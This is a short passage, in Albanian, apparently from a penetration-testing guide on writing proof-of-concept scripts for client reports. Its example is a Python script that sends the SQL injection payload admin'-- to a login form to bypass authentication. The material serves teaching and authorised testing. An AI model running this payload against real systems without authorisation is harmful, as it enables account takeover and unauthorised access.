PoC-i nuk është exploit-i yt i plotë. Është dëshmi minimale që tregon impaktin.

**Shembull PoC për SQLi — i shkruar për klientin:**

```python
#!/usr/bin/env python3
"""
PoC: SQL Injection — Authentication Bypass
Target: https://client.com/login
CVE: N/A (custom vulnerability)
CVSS: 9.1 Critical
Tester: [emri yt]
Date: 2025-01-15

IMPACT: Attacker bypasses authentication completely,
        gaining access to any user account including admin.

USAGE: python3 poc_sqli.py --url https://target.com/login
"""
import requests
import argparse

def demonstrate_sqli(url: str) -> None:
    """Demonstrates auth bypass via SQL injection."""
    
    payload = {"username": "admin'--", "password": "anything"}
    
    print(f"[*] Target: {url}")
    print(f"[*] Payload: username = admin'--")
    print(f"[*] Sending request...")
    
    resp = requests.post(url, data=payload, allow_redirects=False)
    
    if resp.status_code == 302 and "dashboard" in resp.headers.get("Location", ""):
        print(f"[+] SUCCESS — Authentication bypassed!")
        print(f"[+] Redirected to: {resp.headers['Location']}")
        print(f"\n[!] EVIDENCE: HTTP {resp.status_code}")
        print(f"    Location: {resp.headers.get('Location')}")
        print(f"    Set-Cookie: {resp.headers.get('Set-Cookie', 'N/A')}")
    else:
        print(f"[-] Did not trigger — status: {resp.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC: SQLi Auth Bypass")
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    demonstrate_sqli(args.url)
```